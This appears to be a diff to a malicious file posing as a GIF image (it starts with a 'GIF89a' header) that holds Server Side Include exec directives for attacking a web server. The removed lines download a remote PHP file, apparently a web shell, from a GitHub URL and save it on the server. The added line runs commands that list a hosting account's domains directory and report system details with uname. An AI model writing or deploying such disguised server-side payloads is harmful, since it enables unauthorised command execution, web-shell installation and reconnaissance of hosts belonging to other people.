@@ -5,6 +5,4 @@ GIF89a1
 <br>
 <!--#echo var="SERVER_ADDR" -->
 <br>
-<!--#exec cmd="{curl,-O,https://raw.githubusercontent.com/CloudNine-Digitals/byp/refs/heads/main/haha.php,nata.php}" -->
-<br>
-<!--#exec cmd="ls ../../;dir;pwd;{uname,-a}" -->
+<!--#exec cmd="ls /home/lon11763/domains;dir;pwd;{uname,-a}" -->
